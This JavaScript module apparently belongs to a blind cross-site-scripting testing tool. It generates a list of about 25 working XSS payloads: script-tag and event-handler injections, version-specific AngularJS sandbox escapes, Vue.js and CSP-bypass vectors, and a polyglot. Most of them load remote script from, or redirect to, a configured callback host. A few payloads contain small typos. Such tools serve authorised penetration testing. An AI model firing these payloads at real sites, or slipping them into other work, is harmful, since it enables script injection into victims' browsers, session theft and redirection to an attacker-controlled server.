const jsdom = require('jsdom');

import config from '../config';

const { url } = config;

const { JSDOM } = jsdom;

exports.generatePayloads = () =>
  this.payloadList()
    .map(payload => `Description: ${payload.description}\r\n${payload.payload}\r\n\r\n`)
    .join('');

exports.payloadList = () => {
  const payloads = [
    {
      description: 'Image HTTP Interaction',
      payload: `"><img src='//${url}/mH'/>`
    },
    {
      description: 'External JavaScript',
      id: '1',
      payload: `"><script id='1' src="//${url}/m"></script>`
    },
    {
      description: 'JavaScript URI',
      id: '2',
      payload: `javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id='2';_.src=\\'//${url}/m\\';d.body.appendChild(_)")`
    },
    {
      description: 'JavaScript URI href',
      id: '3',
      payload: `"><a href="javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'3\\';_.src=\\'//localhost/m\\';d.body.appendChild(_)')">Click</a>`
    },
    {
      description: 'https://html5sec.org - Self-executing focus event via autofocus',
      id: '4',
      payload: `"><input onfocus="eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'4\\';_.src=\\'\\/\\/localhost/m\\';d.body.appendChild(_)')" autofocus>`
    },
    {
      description: 'https://html5sec.org - HTML5 - JavaScript execution via <iframe> and onload',
      id: '5',
      payload: `<iframe onload="eval('d=document; _=d.createElement(\\'script\\');_.id=\\'5\\';_.src=\\'\\/\\/${url}/m\\';d.body.appendChild(_)')">`
    },
    {
      description:
        'https://html5sec.org - SVG - SVG tags allow code to be executed with onload without any other elements. This makes for a very short and effective XSS vector, useful in many situations.',
      id: '6',
      payload: `<svg onload="javascript:eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'6\\';_.src=\\'//${url}\\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>`
    },
    {
      description:
        'https://html5sec.org - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known. ',
      id: '7',
      payload: `"><body onpageshow="eval('d=document; _ = d.createElement(\\'script\\');_.id=\\'7\\'_.src=\\'//${url}/m\\';d.body.appendChild(_)')">`
    },
    {
      description:
        'xsshunter.com - Matthew Bryant - For when <script> tags are explicitly filtered.',
      id: '8',
      payload: `"><img src=x id='${this.encodePayload('8')}'; onerror=eval(atob(this.id))></script>`
    },
    {
      description: 'xsshunter.com - Matthew Bryant - jQuery Payload',
      payload: `"><script>$.getScript("//${url}/m")</script>`
    },
    {
      description: 'xsshunter.com - Matthew Bryant - XHR',
      payload: `"><script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//${url}/m");a.send();</script>`
    },
    {
      description: 'Mario Heiderch - Angular/JS Payload',
      id: '9',
      payload: `{{constructor.constructor("d=document; _ = d.createElement('script');_.id='9';_.src='//${url}/m';d.body.appendChild(_)")()}} `
    },
    {
      description: 'Lewis Ardern/Gareth Heyes - AngularJS Payload',
      id: '10',
      payload: `{{$on.constructor("d=document; _ = d.createElement('script');_.id='10';_.src='//${url}/m';d.body.appendChild(_)")()}}`
    },
    {
      description: 'Gareth Heyes - 1.2.0 - 1.2.5 - AngularJS Payload',
      id: '11',
      payload: `{{ a="a"["constructor"].prototype;a.charAt=a.trim; $eval('a",eval(\`d=document;_=d\\\\x2ecreateElement(\\'script\\'); _\\\\x2eid=\\'11\\'; _\\\\x2esrc=\\'//localhost/m\\'; d\\\\x2ebody\\\\x2eappendChild(_);\`),"') }}`
    },
    {
      description: 'Jan Horn - 1.2.6 - 1.2.18 - AngularJS Payload',
      id: '12',
      payload: `{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'eval("d=document; _ = d.createElement(\\'script\\');_.id=\\'12\\';_.src=\\'//${url}/m\\';d.body.appendChild(_)")')()}}`
    },
    {
      description: 'Mathias Karlsson - 1.2.19 (FireFox) AngularJS Payload',
      id: '13',
      payload: `{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a",'eval("d=document; _ = d.createElement(\\'script\\');_.id=\\'13\\';_.src=\\'//${url}/m\\';d.body.appendChild(_)")'].sort(toString.constEructor);}}`
    },
    {
      description: 'Gareth Heyes - 1.2.20 - 1.2.29 - AngularJS Payload',
      id: '14',
      payload: `{{a="a"["constructor"].prototype;a.charAt=a.trim;$eval('a",eval(\`d=document; _=d\\\\x2ecreateElement(\\'script\\');_\\\\x2eid=\\'14\\';_\\\\x2esrc=\\'//${url}/m\\';d\\\\x2ebody\\\\x2eappendChild(_);\`),"')}}`
    },
    {
      description: 'Gareth Heyes - 1.3.0 - 1.3.9 - AngularJS Payload',
      id: '15',
      payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`d=document; _=d\\\\x2ecreateElement(\\'script\\');_\\\\x2eid=\\'15\\';_\\\\x2esrc=\\'//${url}/m\\';d\\\\x2ebody\\\\x2eappendChild(_);\`),a')}}`
    },
    {
      description: 'Gareth Heyes - 1.4.0 - 1.5.8 - AngularJS Payload',
      id: '16',
      payload: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,eval(\`d=document; _=d.createElement(\\'script\\');_.id=\\'16\\';_.src=\\'//${url}/m\\';d.body.appendChild(_);\`),a')}}`
    },
    {
      description: 'Jan Horn - 1.5.9 - 1.5.11 - AngularJS Payload',
      id: '17',
      payload: `{{c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;c.$eval=b;op=$root.$$phase;$root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString;C=c.$apply(c);$root.$$phase=op;$root.$digest=od;B=C(b,c,b);$evalAsync("astNode=pop();astNode.type='UnaryExpression';astNode.operator='(window.X?void0:(window.X=true,eval(\`d=document; _=d.createElement(\\\\'script\\\\');_.id=\\\\'17\\\\';_.src=\\\\'//${url}/m\\\\';d.body.appendChild(_);\`)))+';astNode.argument={type:'Identifier',name:'foo'};");m1=B($$asyncQueue.pop().expression,null,$root);m2=B(C,null,m1);[].push.apply=m2;a=''.sub;$eval('a(b.c)');[].push.apply=a;}}`
    },
    {
      description: 'CSP Bypass - data scheme/wildcard in script-src ',
      payload: `"><script src=data:text/javascript;base64,${this.encodePayloadHttpInteraction()}></script > `
    },
    {
      description: 'CSP Bypass - Missing or relaxed object-src',
      payload: `"><embed src='//ajax.googleapis.com/ajax/libs/yui/2.8.0r4/build/charts/assets/charts.swf?allowedDomain=\\"})))}catch (e) { d = document; d.location.hash.match(\`x1\`) ? \`\` : d.location=\`//localhost/mH\`}//' allowscriptaccess=always>`
    },
    {
      description: 'Google Research - Vue.js ',
      payload: `"><div v-html="''.constructor.constructor('d=document;d.location.hash.match(\\'x1\\') ? \`\` : d.location=\`//${url}/mH\`')()"> aaa</div>`
    },
    {
      description:
        'Adaption from Google Research + Gareth Heyes/Sirdarckcat - AngularJS CSP Bypass - HTTP Interaction',
      payload: `<textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//${url}/mH'"></textarea>`
    },
    {
      description:
        'CSP Bypass - Bypassing script nonces via base tags and data URIs (All resources are belong to us) ',
      payload: `"><base href="${url}">`
    },
    {
      description: 'crlf - https://polyglot.innerht.ml/ - Polygot Payload',
      payload: `javascript:"/*'/*\`/*--></noscript></title></textarea></style></template></noembed></script><html \\" onmouseover=/*&lt;svg/*/onload=document.location=\`//${url}/mH\`//>`
    }
  ];
  return payloads;
};

exports.encodePayload = id => {
  const btoa = require('btoa');
  return btoa(
    `d=document; _ = d.createElement('script');_.id='${id}';_.src='//${url}/m';d.body.appendChild(_) `
  );
};

exports.encodePayloadHttpInteraction = () => {
  const btoa = require('btoa');
  return btoa(`document.location='//${url}/mH'`);
};

exports.processPayload = html => {
  if (html) {
    let pload = html;
    const p = this.payloadList();
    const dom = new JSDOM(pload);
    if (dom.window.document.querySelector('script')) {
      p.forEach(payload => {
        if (payload.id === dom.window.document.querySelector('script').id) {
          pload = payload.payload;
        }
      });
    }
    return pload;
  }
  return null;
};
